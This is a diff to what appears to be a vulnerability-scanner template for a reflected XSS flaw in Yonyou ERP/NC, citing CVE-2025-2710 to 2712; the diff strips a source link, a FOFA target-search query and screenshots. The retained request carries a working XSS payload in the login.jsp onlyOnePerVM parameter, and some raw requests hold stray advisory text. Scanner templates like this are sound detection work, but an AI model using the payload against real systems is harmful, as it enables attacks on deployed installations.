@@ -3,12 +3,8 @@ info:
   name: 用友ERP-存在反射xss漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qgi21u7n6wiibx2p'
+  description: ''
   tags: xss,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qgi21u7n6wiibx2p
-    fofa: app="用友-UFIDA-NC" || icon_hash="1085941792"
 http:
 - raw:
   - 'GET /login.jsp?onlyOnePerVM=hebing%27%3E%3Csvg%20onload=alert(document.domain)%3E HTTP/1.1
@@ -26,11 +22,6 @@ http:
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 
     Accept-Encoding: gzip, deflate
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1753499014771-240ece50-4a3d-488d-b705-176cd9b7e4a2.png)
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1753499015002-63268df4-7b89-427f-8e7f-034d4a915663.png)
 
 
     CVE-2025-2710'
@@ -57,11 +48,6 @@ http:
     Accept-Language: zh-CN,zh;q=0.9
 
     Cache-Control: max-age=0
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1753499015210-26cd8ae0-f396-4b71-9359-86860f50cd94.png)
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1753499015407-8b972be1-783e-4541-a367-16f0e2b3b461.png)
 
 
     CVE-2025-2711
@@ -92,10 +78,6 @@ http:
     Upgrade-Insecure-Requests: 1
 
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1753499015592-6a2fe64c-01bb-4a9d-afbb-0fba3b2bca21.png)
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1753499015802-a88f7508-5d1c-4642-9fc9-f55b62287e03.png)
-
     CVE-2025-2712
 
     API
@@ -121,12 +103,7 @@ http:
 
     Accept-Language: zh-CN,zh;q=0.9
 
-    Upgrade-Insecure-Requests: 1
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1753499016015-daa416e2-733d-439c-b888-2c457c51020e.png)
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1753499016175-894539aa-15a6-4942-99ef-8d0369d6a165.png)'
+    Upgrade-Insecure-Requests: 1'
   redirects: false
   matchers:
   - status:
